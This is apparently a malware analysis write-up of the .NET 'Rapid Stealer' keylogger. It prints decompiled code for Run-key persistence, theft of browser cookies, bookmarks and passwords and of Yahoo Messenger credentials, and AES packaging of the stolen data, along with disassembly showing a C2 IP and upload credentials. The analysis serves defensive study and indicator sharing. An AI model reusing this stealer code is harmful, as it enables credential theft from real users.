# [Quick Note] Analyze .NET sample e978503d4859ba8b171741163516ea75

# Overview
MD5: e978503d4859ba8b171741163516ea75
Any-run: https://any.run/report/6db0f23260293a85f051c8a7314489c3f375767821300664788c4e27214d01f1/0fd7729f-791d-4834-bbdb-710c3d701271 </br>

This sample have a name is ```Stealer``` or ```Rapid Stealer```, it's keylogger with a few function to steal data browser app, messenger app, proxy app, capture keyboard and capture screenshot. This sample developing by .NET language

# Analyze
# 1. Stage 1
Signature of this sample </br>
```
code-page:          Unicode UTF-16, little endian
Comments:           Process for Windows
CompanyName:        Microsoft
FileDescription:    Process for Windows
FileVersion:        1.0.0.0
InternalName:       Stealer.exe
LegalCopyright:     Copyright ©  2013
OriginalFilename:   Stealer.exe
ProductName:        Process for Windows
ProductVersion:     1.0.0.0
Assembly Version:   1.0.0.0
```
Quick check on ```Main``` function, before start this sample created two files ```\\RapidStartTech.stl``` ```AppTransferWiz.dll``` and execute dll file firstly. </br>
```
	Program._appDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IntelRapidStart";
	if (!Directory.Exists(Program._appDataDirectory))
	{
		Directory.CreateDirectory(Program._appDataDirectory);
	}
	Program._mustUploadDir = string.Format("{0}\\ume", Program._appDataDirectory);
	string path = Program._appDataDirectory + "\\RapidStartTech.stl";
	if (File.Exists(path))
	{
		string[] array = File.ReadAllLines(path);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = Base64.Decode(array[i]);
		}
		Program._startupEnabled = (array[6] == "True");
		Program._keyLoggerEnabled = (array[7] == "True");
		Program._screenshotEnabled = (array[8] == "True");
		Program._keyLoggerValue = int.Parse(array[9]);
		Program._keyLogIsLimitedBySize = (array[10] == "True");
		Program._screenInterval = int.Parse(array[12]);
		Program._screenCounter = int.Parse(array[13]);
		if (!Directory.Exists(Program._mustUploadDir))
		{
			Directory.CreateDirectory(Program._mustUploadDir);
		}
		Program.ExtractResources(Program._appDataDirectory);
		string text = string.Format("{0}\\{1}", Program._appDataDirectory, "AppTransferWiz.dll");
		if (File.Exists(text))
		{
			Process.Start("rundll32.exe", string.Format("\"{0}\",#110", text));
		}
```
After created and run sucessfully, this sample finding registry setup for startup of with OS of sample. If not existed, sample call functions ```SetStartup``` to setup into registry ```SOFTWARE\Microsoft\Windows\CurrentVersion\Run``` with key name ```IntelRapidStart``` </br>
```
	string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	text += string.Format("\\IntelRapidStart\\{0}", AppDomain.CurrentDomain.FriendlyName);
	RegistryKey currentRegistryKey = Program.GetCurrentRegistryKey();
	RegistryKey registryKey = currentRegistryKey.OpenSubKey(Base64.Decod("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), true);
	if (registryKey != null)
	{
		registryKey.SetValue(processName, text);
	}
```
When startup and setup successfully, sample will collect to data, password of browser app,  messenger app and compress it this data into files ```.Enc``` with encryption cipher is AES (RijndaelCrypto) </br>
```
    xmlWriter.WriteStartElement("BrowserPasswords");
    if (Program._isSqliteExist)
    {
    	Program.GetBrowserPasswords(xmlWriter, new Firefox());
    	Program.GetBrowserPasswords(xmlWriter, new Chrome());
    	Program.GetBrowserPasswords(xmlWriter, new Opera());
    {
	
    xmlWriter3.WriteStartElement("Messenger");
    Program.GetMessengerData(xmlWriter3, new Pidgin());
    Program.GetMessengerData(xmlWriter3, new YahooMessenger());
    Program.GetMessengerData(xmlWriter3, new Gtalk());
    Program.GetMessengerData(xmlWriter3, new Skype());
    xmlWriter3.WriteEndElement();
    }

    byte[] array2 = RijndaelCrypto.Encrypt(Program.PassStream.ToArray(), "HavijeBaba", "salam!*%#");
	string path2 = string.Format("{0}\\Pass_{1}_{2}.Enc", Program._mustUploadDir, Environment.MachineName, DateTime.NoToStrin("yyyyMMdd_hhmm"));
	if (array2 != null)
	{
		File.WriteAllBytes(path2, array2);
	}
```
Malware forcus steal data as bookmark, cookies, histories, password and proxies of 4 browser applications Chrome, FireFox, Opera and Internet Explorer on victim machine. Example: </br>
This code as below, have a mission steal bookmark data of Chrome browser with find path ```\\Google\\Chrome\\User Data\\Default\\Bookmarks``` and search with regex into code to find bookmark data
```
string text = FileOperation.FindFilePath(Base64.Decode("XFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxCb29rbWFya3M="));
[...]
Match match = Regex.Match(File.ReadAllText(path), "\"url\": \"(.*?)\"", RegexOptions.IgnoreCase);
int num = "\"url\": \"(.*?)\"".IndexOf("(.*?)", StringComparison.Ordinal);
int num2 = 0;
while (match.Success)
{
	list.Add(new Bookmark
	{
		Title = Convert.ToString(num2++),
		Url = match.ToString().Replace("\"url\": \"(.*?)\"".Substring(1, --num), string.Empty).Replace("\"", string.Empty)
	});
	match = match.NextMatch();
```
This code as below for ```GetCookies``` function, similar as ```GetBookmarks``` function it find this data into path ```\\Google\\Chrome\\User Data\\Default\\Cookies```, copy it into file temp and store it into database of malware
```
string text = FileOperation.FindFilePath(Base64.Decode("XFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxDb29raWVz"));
[...]
if (!FileOperation.CopyFileToTempArea(text, out text2))
{
	Cookie[] result = null;
	return result;
}
[...]
if (sqLiteProvider.ExecuteQuery(Base64.Decode("c2VsZWN0ICogZnJvbSBjb29raWVz")))
{
	while (sqLiteProvider.ReadRow())
	{
		list.Add(new Cookie
		{
			HostKey = sqLiteProvider.GetStringByName("host_key"),
			Name = sqLiteProvider.GetStringByName("name"),
			Value = sqLiteProvider.GetStringByName("value"),
			Path = sqLiteProvider.GetStringByName("path")
		});
	}
}
```
With ```GetHistories``` ```GetPasswords``` and ```GetProxies``` functions, it code similiar as ```GetCookies```. </br>

Besides stealing data of browser, malware still stealing data of message application YahooMessenger, Skype, Gtalk, Pidin. Example: </br>
This code as below show malware steal username and password of YahooMessenger through hardcoded registry into code and encoded this string with Base64 </br>
```
public MessengerInfo GetUsernameAndPassword()
{
	List<Account> list = new List<Account>();
	string version = string.Empty;
	try
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(this._yahooRegistryKey, true);
		if (registryKey == null || registryKey.ValueCount == 0)
		{
			MessengerInfo result = null;
			return result;
		}
		string text = registryKey.GetValue(this._yahooUsernameKey, string.Empty).ToString();
		if (string.IsNullOrEmpty(text))
		{
			MessengerInfo result = null;
			return result;
		}
		string text2 = registryKey.GetValue(this._yahooPasswordKey, string.Empty).ToString();
		if (text2.Length == 0)
		{
			MessengerInfo result = null;
			return result;
		}
		list.Add(new Account
		{
			Username = text,
			Password = this.Decode(text, text2)
		});
		version = registryKey.GetValue("Version").ToString();
		registryKey.SetValue(this._yahooUsernameKey, string.Empty);
		registryKey.SetValue(this._yahooPasswordKey, string.Empty);
	}
	catch (Exception)
	{
	}
	return new MessengerInfo
	{
		Version = version,
		Accounts = list.ToArray()
	};

// Token: 0x04000032 RID: 50
private const string YahooVersionKey = "Version"
// Token: 0x04000033 RID: 51
private readonly string _yahooUsernameKey = Base64.Decode("WWFob28hIFVzZXIgSUQ=") // Yahoo! User ID
// Token: 0x04000034 RID: 52
private readonly string _yahooPasswordKey = Base64.Decode("RVRT") // ETS
// Token: 0x04000035 RID: 53
private readonly string _yahooSavePassword = Base64.Decode("U2F2ZSBQYXNzd29yZA==") // Save Password
// Token: 0x04000036 RID: 54
private readonly string _yahooRegistryKey = Base64.Decode("U09GVFdBUkVceWFob29ccGFnZXI=") // SOFTWARE\yahoo\pager
// Token: 0x04000037 RID: 55
private readonly string _ymsgAuthKey = Base64.Decode("TUJDUyBzdWNrcw=="); // MBCS sucks
```
# Stage 2: Analyze resource of this malware
During analyze this malware, have an function of this malware loading and using two resource with name ```DelphiNative``` and ```Transfer```. Quick check raw data of two resource and see a few byte signater of PE files </br>
```
// Token: 0x1700003B RID: 59
// (get) Token: 0x06000171 RID: 369 RVA: 0x00006B14 File Offset: 0x00004D14
internal static byte[] DelphiNative
{
	get
	{
		object @object = Resources.ResourceManager.GetObject("DelphiNative", Resources.resourceCulture);
		return (byte[])@object;
	}

// Token: 0x1700003C RID: 60
// (get) Token: 0x06000172 RID: 370 RVA: 0x00006B3C File Offset: 0x00004D3C
internal static byte[] Transfer
{
	get
	{
		object @object = Resources.ResourceManager.GetObject("Transfer", Resources.resourceCulture);
		return (byte[])@object;
	}
}
```
```
// 0x0000E852: DelphiNative‎ = 49152 bytes
4D5A50000200000004000F00FFFF0000B80000000000000040001A00000000000000000000000000000000000000000000000000000000000000000000010000BA10000E1FB409CD21B8014CCD219090546869732070726F6772616D206D7573742062652072756E20756E6465722057696E33320D0A2437000000000000000000000000000000000000000000000000000000

// 0x0001A857: Transfer‎ = 54272 bytes
4D5A50000200000004000F00FFFF0000B80000000000000040001A00000000000000000000000000000000000000000000000000000000000000000000010000BA10000E1FB409CD21B8014CCD219090546869732070726F6772616D206D7573742062652072756E20756E6465722057696E33320D0A243700000000
```
Dump two resource of this malware and continue anlyze. With ```DelphiNative```, this is dll file with name ```DelphiNative.dll``` and a few information as below: </br>
```
md5: 05EA4103354C54489A542A6EE3696E5E 
Time Date Stamp: Friday, 19.06.1992 22:22:17 UTC 
file-type: dynamic-link-library 
compiler: Borland Delphi(6-7 or 2005) 
```
Static analysis this sample, can see main task of this sample collection process name, process id, keyboard type, version OS, RDP/IE account and collect information on registry of victim machine. </br>
Sample use ```GetForegroundWindow``` to retrieves a handle to the foreground window and have another function to get process id of it. Afer that using function ```f_compare_and_find_match_process_id``` to find process id of IExplore and chrome. </br>
```
  v6 = GetForegroundWindow();                   // Retrieves a handle to the foreground window (the window with which the user is currently working).
  f_get_process_id(v6, &v22);
  v7 = 7;
  v8 = (int *)&off_40A2C8;                      // "IExplore"
  do
  {
    f_convert_int_to_character((_BYTE *)*v8, &v18);
    f_append_string_with_exe((char **)&v18, ".exe");// function handle append strings IExplore with ".exe" to "IExplore.exe"
    f_compare_and_find_match_process_id(v18, v22);// this function handle compare and find match process id of IExplore with list process id collect before
    if ( v9 && sub_4099DC(*v8, (int)&v21, (int)&v20) )
    {
      v5 = -1;
      v19 = sub_4042C0(v21);
      sub_4061D0((char *)a4, v19, a5);
      goto LABEL_8;
    }
    ++v8;
    --v7;
  }
  while ( v7 );                                 // loop to find correct process id and process name IExplorer
  f_compare_and_find_match_process_id((int)v22, (int *)off_40A2E4);// find process id of "chrome.exe"
```
Using two API windows function ```GetKeyboardType``` and ```GetVersion``` to collect keyboard type and version of victim machine </br>
```
byte_40A008 = 2;
 dword_40B014 = (int)RaiseException;
 dword_40B018 = (int)RtlUnwind;
 byte_40B046 = 2;
 dword_40B000 = (int)sub_404664;
 if ( (unsigned __int8)f_get_keyboard_type() )
   sub_403350();
 sub_403414();
 word_40B04C = -10320;
 word_40B218 = -10320;
 word_40B3E4 = -10320;
 dword_40B03C = (int)GetCommandLineA();
 dword_40B038 = sub_4011B8();
 if ( (GetVersion() & 0x80000000) == 0x80000000 )
 {
   GetThreadLocale();
   CodePage = sub_404D44();
 }
 else if ( (unsigned __int8)GetVersion() <= 4u )
```
Or collect value on a few registry ```HKEY_CURRENT_USER\\Software\\Borland\\Locales``` ```HKEY_LOCAL_MACHINE\\Software\\Borland\\Locales``` ```HKEY_CURRENT_USER\\Software\\Borland\\Delphi\\Locales``` </br>
```
if ( !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Locales", 0, 0xF0019u, &phkResult)
  || !RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Borland\\Locales", 0, 0xF0019u, &phkResult)
  || !RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Borland\\Delphi\\Locales", 0, 0xF0019u, &phkResult) )
{
  v6 = &savedregs;
  v5 = (CHAR *)&loc_404A64;
  v4 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v4);
  cbData = 5;
  f_get_path_name_and_find_file(Filename, 261);
  if ( RegQueryValueExA(phkResult, Filename, 0, 0, &Data, &cbData)
    && RegQueryValueExA(phkResult, ValueName, 0, 0, &Data, &cbData) )
  {
    Data = 0;
  }
  v11 = 0;
  __writefsdword(0, v4);
  v6 = (int *)&loc_404A6B;
  RegCloseKey(phkResult);
```
With ```Transfer```, this is dll file with name ```Transfer.dll``` and a few information as below: </br>
```
md5: 8327BF1DFD4DB6D78D1D17F297FCCC87
Time Date Stamp: Friday, 19.06.1992 22:22:17 UTC
file-type: dynamic-link-library 
compiler: Borland Delphi(6-7 or 2005)
```
Date time compile of two sample the same but ```Transfer``` using library ```wininet.dll``` and ```DelphiNative``` not used it. As the name, sample using this library to establish connect and send data to C2 server </br>
Main task of this function is collect information system of victim machine, ebstablish connection with C2 server and send information. </br>
IP and a few string encoded by Base64 cipher and using function to decoded </br>
```
CODE:0040A7E0 mov     eax, offset _str_ODguMTUwLjIyNy4.Text ; ODguMTUwLjIyNy4xOTc= -> 88.150.227.197 (IP)
CODE:0040A7E5 call    f_decode_string_base64
CODE:0040A7EA lea     edx, [ebp+var_8]
CODE:0040A7ED mov     eax, offset _str_bWFpbmxvZw__.Text ; bWFpbmxvZw== -> mainlog
CODE:0040A7F2 call    f_decode_string_base64
CODE:0040A7F7 lea     edx, [ebp+var_C]
CODE:0040A7FA mov     eax, offset _str_QW1hck1pZ2lyaW0.Text ; QW1hck1pZ2lyaW0= -> AmarMigirim
CODE:0040A7FF call    f_decode_string_base64
CODE:0040A804 lea     eax, [ebp+var_170]
CODE:0040A80A mov     ecx, offset _str_SysInfo__Enc.Text ; SysInfo*.Enc
```
And user-agent data </br>
```
CODE:00409E33 mov     edx, offset _str_Mozilla_5_0__co.Text ; Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)
CODE:00409E38 call    @System@@LStrAsg$qqrpvpxv ; System::__linkproc__ LStrAsg(void *,void *)
CODE:00409E3D lea     eax, [esi+18h]
CODE:00409E40 mov     edx, offset _str__.Text 
```

# Interested string
```
IP: 88.150.227.197
User-agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)
```